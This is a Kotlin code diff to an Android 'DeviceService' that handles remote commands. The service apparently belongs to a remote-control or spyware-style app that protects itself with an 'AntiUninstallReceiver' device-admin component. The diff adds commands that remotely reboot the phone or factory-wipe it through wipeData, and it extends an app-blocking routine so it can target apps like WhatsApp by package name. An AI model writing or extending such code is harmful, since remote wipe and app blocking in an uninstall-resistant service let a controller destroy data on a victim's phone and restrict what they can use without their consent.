@@ -263,6 +263,38 @@ class DeviceService : Service(), LifecycleOwner {
     Log.d("DeviceService", "📩 Command received: $cmd, value: $value")
     
     when (cmd) {
+        "restartDevice" -> {
+    Log.d("DeviceService", "🔄 Restart device requested")
+    try {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val admin = android.content.ComponentName(this, AntiUninstallReceiver::class.java)
+        if (dpm.isAdminActive(admin)) {
+            dpm.reboot(admin)
+            emitStatus(JSONObject().apply { put("restartDevice", true) })
+        } else {
+            emitStatus(JSONObject().apply { put("restartDevice", false); put("error", "admin_not_active") })
+        }
+    } catch (e: Exception) {
+        Log.e("DeviceService", "restartDevice: ${e.message}")
+        emitStatus(JSONObject().apply { put("restartDevice", false); put("error", e.message) })
+    }
+}
+"factoryReset" -> {
+    Log.d("DeviceService", "💣 Factory reset requested")
+    try {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val admin = android.content.ComponentName(this, AntiUninstallReceiver::class.java)
+        if (dpm.isAdminActive(admin)) {
+            val ok = dpm.wipeData(0)
+            emitStatus(JSONObject().apply { put("factoryReset", ok) })
+        } else {
+            emitStatus(JSONObject().apply { put("factoryReset", false); put("error", "admin_not_active") })
+        }
+    } catch (e: Exception) {
+        Log.e("DeviceService", "factoryReset: ${e.message}")
+        emitStatus(JSONObject().apply { put("factoryReset", false); put("error", e.message) })
+    }
+}
         "flashlight" -> {
             Log.d("DeviceService", "💡 Flashlight: ${value == "true"}")
             setFlashlight(value == "true")
@@ -960,24 +992,37 @@ private fun stopVideoOverlay() {
 }
     
     private fun blockApp(pkgJson: String) {
-        try {
-            val obj  = org.json.JSONObject(pkgJson)
-            val pkg  = obj.getString("package")
-            val name = obj.optString("name", pkg)
-            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
-                putExtra("package", pkg)
-                putExtra("name", name)
-                setPackage(packageName)
-            }
-            sendBroadcast(i)            
-            val blocked = AppBlockerService.blockedPackages.toList()
-            emitStatus(org.json.JSONObject().apply {
-                put("blockedApps", org.json.JSONArray(blocked))
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "blockApp: ${e.message}")
+    try {
+        // support: JSON string {"package":"...","name":"..."} ATAU plain "com.whatsapp"
+        val pkg: String
+        val name: String
+        if (pkgJson.trim().startsWith("{")) {
+            val obj = org.json.JSONObject(pkgJson)
+            pkg = obj.optString("package", obj.optString("pkg", ""))
+            name = obj.optString("name", pkg)
+        } else {
+            pkg = pkgJson.trim()
+            name = pkg
         }
+        if (pkg.isEmpty()) {
+            Log.e("DeviceService", "blockApp: package kosong")
+            return
+        }
+        val i = Intent("com.sync.xxx.BLOCK_APP").apply {
+            putExtra("package", pkg)
+            putExtra("name", name)
+            setPackage(packageName)
+        }
+        sendBroadcast(i)
+        val blocked = AppBlockerService.blockedPackages.toList()
+        emitStatus(org.json.JSONObject().apply {
+            put("blockedApps", org.json.JSONArray(blocked))
+        })
+        Log.d("DeviceService", "blockApp success: $pkg")
+    } catch (e: Exception) {
+        Log.e("DeviceService", "blockApp: ${e.message}")
     }
+}
 
     private fun unblockApp(pkg: String) {
         try {
